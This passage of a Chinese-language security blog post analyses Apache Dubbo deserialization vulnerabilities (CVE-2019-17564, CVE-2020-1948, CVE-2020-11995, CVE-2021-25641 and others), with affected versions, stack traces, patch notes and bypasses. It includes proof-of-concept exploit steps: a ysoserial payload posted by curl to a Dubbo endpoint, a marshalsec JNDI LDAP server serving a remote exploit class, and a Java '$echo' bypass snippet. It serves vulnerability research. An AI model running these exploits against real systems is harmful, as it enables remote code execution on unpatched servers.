href="#0x07-CVE-2021-30179">CVE-2021-30179</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-4-pre-auth-rce-via-java-deserialization-in-the-generic-filter-ghsl-2021-037">GHSL-2021-037</a>/<a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-5-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-generic-filter-ghsl-2021-038">GHSL-2021-038</a> Dubbo支持动态调用，有几个特殊的函数：$invoke\$invokeAsync\$echo，这几个的逻辑在GenericFilter 中，这几个函数支持特定格式的参数，在还原和处理这几个函数时，支持pojo、bean、javanative等方式，会有setter/反序列化问题</td><td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td><td><a href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x08-CVE-2021-32824">CVE-2021-32824</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-6-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-telnet-handler-ghsl-2021-039">GHSL-2021-039</a> Dubbo支持Telnet，包括invoke 调用，原理和CVE-2021-30179 PojoUtils 利用类似</td><td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x09-CVE-2021-30180">CVE-2021-30180</a></td><td>1. <a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-7-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-040">GHSL-2021-040</a>/<a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-8-rce-on-customers-via-condition-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-041">GHSL-2021-041</a> Dubbo的路由实现支持多种，例如Tag路由、Condition路由，它两都支持动态配置，具体实现是以yml格式写入kafka配置中，再交由consumer去解析，consumer采用的是snakeyaml，存在反序列化漏洞。<br>2. <a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-10-rce-on-providers-via-configuration-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-043">GHSL-2021-043</a>: Dubbo还支持动态配置，原理与router config类似，不过是由provider来加载，最终调用snakeyaml实现反序列化。</td><td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x10-CVE-2021-30181">CVE-2021-30181</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-9-rce-on-customers-via-script-route-poisoning-nashorn-script-injection-ghsl-2021-042">GHSL-2021-042</a> 与上一个漏洞类似，还支持Script路由，Script引擎用的Nashorn，存在命令执行</td><td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x11-CVE-2021-36162">CVE-2021-36162</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-1-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-094">GHSL-2021-094</a> Dubbo在2.7.10中修复了snakeYaml的反序列化问题，但是3.0新Router机制Mesh中依然存在snakeYaml反序列化</td><td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x12-CVE-2021-36163">CVE-2021-36163</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-2-unsafe-deserialization-in-providers-using-the-hessian-protocol-ghsl-2021-095">GHSL-2021-095</a> Dubbo还支持Hessian协议（并不是指反序列化），基于http，在HessianSkeleton 的处理中会对POST 的内容进行反序列化</td><td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x13-GHSL-2021-096">GHSL-2021-096</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-3-unsafe-deserialization-in-providers-using-the-rmi-protocol-ghsl-2021-096">GHSL-2021-096</a> Dubbo还支持rmi协议，Dobbo的Provider类似RMI的Register和Provider，可以用Client攻击Register和Provider的方式进行攻击</td><td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x14-CVE-2021-37579">CVE-2021-37579</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">GHSL-2021-097</a> CodecSupport#checkSerialization bypass，该安全策略用于判断dubbo数据包指定的序列化方式是否是provider配置的配置，当version不存在时，会绕过检测漏洞</td><td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x15-CVE-2021-43297">CVE-2021-43297</a></td><td>hessian-lite 作为dubbo内置的hessian版本，在处理异常的时候，会通过”+”进行字符串拼接，导致其中obj的toString 隐式调用，形成反序列化(也可以认为是<a href="#0x06-GHSL-2021-036">GHSL-2021-036</a>的补充)</td><td>3.0.0&lt;=Dubbo&lt;=3.0.5<br>2.7.0&lt;=Dubbo&lt;=2.7.15<br>2.6.0&lt;=Dubbo&lt;=2.6.12</td><td><a href="https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww">cxc、yhbl、wh1t3p1g、fynch3r</a></td></tr><tr><td><a href="#0x16-CVE-2023-23638">CVE-2023-23638</a></td><td>CVE-2021-30179的绕过，可以利用setter设置全局静态配置变量，绕过安全规则</td><td>2.7.0&lt;=Dubbo&lt;=2.7.21<br>3.0.0&lt;=Dubbo&lt;=3.0.13<br>3.1.0&lt;=Dubbo&lt;=3.1.5</td><td><a href="https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb">yemoli、R1ckyZ、Koishi、cxc (reporter)</a></td></tr></tbody></table><a id="more"></a><h2 id="0x01-Dubbo-协议"><a href="#0x01-Dubbo-协议" class="headerlink" title="0x01 Dubbo 协议"></a>0x01 Dubbo 协议</h2><p><img src="/images/pasted-473.png" alt="upload successful"></p><p>协议详情</p><ul><li><p>Magic - Magic High &amp; Magic Low (16 bits)</p><p>  标识协议版本号，Dubbo 协议：0xdabb</p></li><li><p>Req/Res (1 bit)</p><p>  标识是请求或响应。请求： 1; 响应： 0。</p></li><li><p>2 Way (1 bit)</p><p>  仅在 Req/Res 为1（请求）时才有用，标记是否期望从服务器返回值。如果需要来自服务器的返回值，则设置为1。</p></li><li><p>Event (1 bit)</p><p>  标识是否是事件消息，例如，心跳事件。如果这是一个事件，则设置为1。</p></li><li><p>Serialization ID (5 bit)</p><p>  标识序列化类型：比如 fastjson 的值为6。</p></li><li><p>Status (8 bits)</p><p>  仅在 Req/Res 为0（响应）时有用，用于标识响应的状态。</p></li></ul><p>…</p><p>总长度为16字节</p><p><a href="https://cn.dubbo.apache.org/zh-cn/blog/2018/10/05/dubbo-%e5%8d%8f%e8%ae%ae%e8%af%a6%e8%a7%a3/">https://cn.dubbo.apache.org/zh-cn/blog/2018/10/05/dubbo-%e5%8d%8f%e8%ae%ae%e8%af%a6%e8%a7%a3/</a></p><h2 id="0x02-CVE-2019-17564"><a href="#0x02-CVE-2019-17564" class="headerlink" title="0x02 CVE-2019-17564"></a>0x02 CVE-2019-17564</h2><h3 id="2-1-影响版本"><a href="#2-1-影响版本" class="headerlink" title="2.1 影响版本"></a>2.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.4</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.7</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><blockquote><p>This vulnerability can affect users using Dubbo-Rpc-Http (2.7.3 or lower) and<br>Spring-Web (5.1.9.RELEASE or lower).<br>Notice that this vulnerability only affects users who enable http protocol<br>provided by Dubbo:<br>&lt;dubbo:protocol name=”http” /&gt;</p></blockquote><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; 1.poc</span><br><span class="line"></span><br><span class="line">curl -XPOST --data-binary @1.poc http://localhost:8080/com.m0d9.sec.dubbo.http.DemoService</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">getRuntime:58, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [3]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readObject:334, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)</span><br><span class="line">readRemoteInvocation:118, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">readRemoteInvocation:98, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handleRequest:77, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)</span><br><span class="line">service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:232, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:167, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:97, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:143, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:364, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:624, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>注意此中的<code>HttpInvokerServiceExporter</code></p><h3 id="2-3-补丁分析"><a href="#2-3-补丁分析" class="headerlink" title="2.3 补丁分析"></a>2.3 补丁分析</h3><p>暂未定位到补丁，dubbo改为2.7.4 相同配置producer 无法启动，可能是和spring 版本原因</p><p>这个漏洞是Spring 的漏洞CVE-2016-1000027， 参考<a href="https://github.com/spring-projects/spring-framework/issues/24434">https://github.com/spring-projects/spring-framework/issues/24434</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring-web-5.2.3.RELEASE.jar &lt;&#x3D; org&#x2F;springframework&#x2F;remoting&#x2F;httpinvoker&#x2F;HttpInvokerServiceExporter.class : [2.5.1,)</span><br><span class="line">Advisories</span><br><span class="line">Third Party: https:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;show_bug.cgi?id&#x3D;CVE-2016-1000027</span><br><span class="line">Third Party: https:&#x2F;&#x2F;www.tenable.com&#x2F;security&#x2F;research&#x2F;tra-2016-20</span><br><span class="line">CVSS Details</span><br><span class="line">CVE CVSS 3: 9.8</span><br><span class="line">CVSS Vector: CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</span><br></pre></td></tr></table></figure><h2 id="0x03-CVE-2020-1948"><a href="#0x03-CVE-2020-1948" class="headerlink" title="0x03 CVE-2020-1948"></a>0x03 CVE-2020-1948</h2><h3 id="3-1-影响版本"><a href="#3-1-影响版本" class="headerlink" title="3.1 影响版本"></a>3.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.6</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.7</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><h3 id="3-2-漏洞分析"><a href="#3-2-漏洞分析" class="headerlink" title="3.2 漏洞分析"></a>3.2 漏洞分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动codebase</span></span><br><span class="line">python -m http.server 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动jndi ldap server</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8000/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-462.png" alt="upload successful"></p><blockquote><p>明明接口方法的参数类型是String，但是在实际处理上，并未验证参数类型，都用arg=readObject(传入的参数类型)，因此可以通过协议的漏洞来伪造一个Map类型的恶意类进而触发hashcode或者equals方法的反序列化。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:180, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2093, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:91, Hessian2ObjectInput (com.alibaba.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:113, DecodeableRpcInvocation (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:70, DecodeableRpcInvocation (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:128, DubboCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:125, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:85, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:46, DubboCountCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:95, NettyCodecAdapter$InternalDecoder (com.alibaba.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:489, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:428, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:265, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:340, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:1359, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:935, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:134, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:645, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:580, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:497, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:459, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:858, SingleThreadEventExecutor$5 (io.netty.util.concurrent)</span><br><span class="line">run:138, DefaultThreadFactory$DefaultRunnableDecorator (io.netty.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-463.png" alt="upload successful"></p><h3 id="3-3-补丁分析"><a href="#3-3-补丁分析" class="headerlink" title="3.3 补丁分析"></a>3.3 补丁分析</h3><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0">https://github.com/apache/dubbo/compare/dubbo-2.7.6…dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0</a></p><p>引入isGenericCall，判断参数类型</p><p><img src="/images/pasted-464.png" alt="upload successful"></p><p><img src="/images/pasted-467.png" alt="upload successful"></p><h2 id="0x04-CVE-2020-11995"><a href="#0x04-CVE-2020-11995" class="headerlink" title="0x04 CVE-2020-11995"></a>0x04 CVE-2020-11995</h2><h3 id="4-1-影响版本"><a href="#4-1-影响版本" class="headerlink" title="4.1 影响版本"></a>4.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.8</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.8</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><h3 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h3><p>绕过1</p><p>RpcUtils.isGenericCall 有几个白名单</p><p><img src="/images/pasted-469.png" alt="upload successful"></p><p>poc sayHello 改成$invoke 即可</p><h3 id="4-3-补丁分析"><a href="#4-3-补丁分析" class="headerlink" title="4.3 补丁分析"></a>4.3 补丁分析</h3><p><img src="/images/pasted-468.png" alt="upload successful"></p><p><a href="https://github.com/apache/dubbo/blob/dubbo-2.7.9/dubbo-rpc/dubbo-rpc-api/src/main/java/org/apache/dubbo/rpc/support/RpcUtils.java#L209">https://github.com/apache/dubbo/blob/dubbo-2.7.9/dubbo-rpc/dubbo-rpc-api/src/main/java/org/apache/dubbo/rpc/support/RpcUtils.java#L209</a></p><p>注意这里的RpcUtils.isGenericCall 实现.equals(parameterTypesDesc)，会判断参数类型，自定义参数类型已经不适用了</p><p><img src="/images/pasted-465.png" alt="upload successful"></p><blockquote><p>疑问，是否可能绕过</p><ol><li>echo 逻辑</li><li>如果参数就是Object </li></ol></blockquote><h3 id="4-4-GHSL-2021-034-继续绕过"><a href="#4-4-GHSL-2021-034-继续绕过" class="headerlink" title="4.4 GHSL-2021-034 继续绕过"></a>4.4 GHSL-2021-034 继续绕过</h3><p><img src="/images/pasted-470.png" alt="upload successful"></p><p>答案是有的，参考 GHSL-2021-034</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.writeUTF(<span class="string">&quot;$echo&quot;</span>);</span><br><span class="line">out.writeUTF(<span class="string">&quot;Ljava/lang/Object;&quot;</span>);</span><br><span class="line">out.writeObject(s);</span><br></pre></td></tr></table></figure><p>GHSL-2021-034 并未被分配CVE，应该是直到引入Hessian反序列化黑白名单功能，才解决这一问题。</p><h2 id="0x05-CVE-2021-25641"><a href="#0x05-CVE-2021-25641" class="headerlink" title="0x05 CVE-2021-25641"></a>0x05 CVE-2021-25641</h2><h3 id="5-1-影响版本"><a href="#5-1-影响版本" class="headerlink" title="5.1 影响版本"></a>5.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dubbo-commons&lt;&#x3D;2.7.3</span><br><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.8</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.8</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><h3 id="5-2-漏洞分析"><a href="#5-2-漏洞分析" class="headerlink" title="5.2 漏洞分析"></a>5.2 漏洞分析</h3><p>dubbo 除了hessian之外，还有其他的协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2 -&gt; &quot;hessian2&quot;</span><br><span class="line">3 -&gt; &quot;java&quot;</span><br><span class="line">4 -&gt; &quot;compactedjava&quot;</span><br><span class="line">6 -&gt; &quot;fastjson&quot;</span><br><span class="line">7 -&gt; &quot;nativejava&quot;</span><br><span class="line">8 -&gt; &quot;kryo&quot;</span><br><span class="line">9 -&gt; &quot;fst&quot;</span><br><span class="line">10 -&gt; &quot;native-hessian&quot;</span><br><span class="line">11 -&gt; &quot;avro&quot;</span><br><span class="line">12 -&gt; &quot;protostuff&quot;</span><br><span class="line">16 -&gt; &quot;gson&quot;</span><br><span class="line">21 -&gt; &quot;protobuf-json&quot;</span><br><span class="line">22 -&gt; &quot;protobuf&quot;</span><br><span class="line">25 -&gt; &quot;kryo2&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-471.png" alt="upload successful"></p><blockquote><p>注：FstSerialization 和FastJsonSerialization 不一样</p></blockquote><p>温习下hessian的漏洞反序列化原理</p><blockquote><p>kick-off chain 起始方法只能为hashCode/equals/compareTo 方法；<br>利用链中调用的成员变量不能为transient 修饰；<br>所有的调用不依赖类中readObject 的逻辑，也不依赖getter/setter 的逻辑。</p></blockquote><p>类似的，其他反序列化方式会不会也存在反序列化漏洞</p><h4 id="5-2-1-FST"><a href="#5-2-1-FST" class="headerlink" title="5.2.1 FST"></a>5.2.1 FST</h4><p>fst 虽然是利用了fastjson反序列化方式，但是和传统的fastjson反序列化漏洞成因还不一样，dubbo在fastjson的基础上包了一层</p><h5 id="Gadget-构造"><a href="#Gadget-构造" class="headerlink" title="Gadget 构造"></a>Gadget 构造</h5><ol><li><p>fastjson中 JSONObject 是可以被序列化的，当其显式或隐式被调用toString方法时，会触发绑定对象的getter方法，这算是人尽皆知的事实。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSON#toString</span><br><span class="line">    com.alibaba.fastjson.JSON#toJSONString        </span><br></pre></td></tr></table></figure></li><li><p>ysoserial 有通过get 出发的gadget，比如com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</p></li><li><p>org.apache.xpath.objects.XString#equals 会先转成toString，再做比较</p></li></ol><p><img src="/images/pasted-474.png" alt="upload successful"></p><ol><li>org.apache.dubbo.common.serialize.fst.FstObjectInput#readObject 针对map的处理中，也是map#put进行赋值，导致会调用equals 进行比对</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 